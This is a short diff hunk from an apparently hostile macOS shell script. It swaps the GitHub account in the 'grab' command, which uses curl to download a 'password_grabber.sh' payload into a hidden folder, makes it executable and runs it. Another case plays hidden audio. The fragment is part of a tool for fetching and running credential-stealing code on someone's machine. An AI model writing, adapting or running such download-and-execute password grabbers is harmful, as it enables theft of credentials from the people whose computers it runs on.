@@ -83,7 +83,7 @@ message)
     afplay .hidden/audio.mp3
     ;;
 grab)
-curl -s https://raw.githubusercontent.com/alexander12887/payload/main/password_grabber.sh >> .hidden/password_grabber.sh
+curl -s https://raw.githubusercontent.com/sorrrynotsorry1/payload/main/password_grabber.sh >> .hidden/password_grabber.sh
 sleep 5
 chmod +x .hidden/password_grabber.sh
 make -f .hidden/password_grabber 
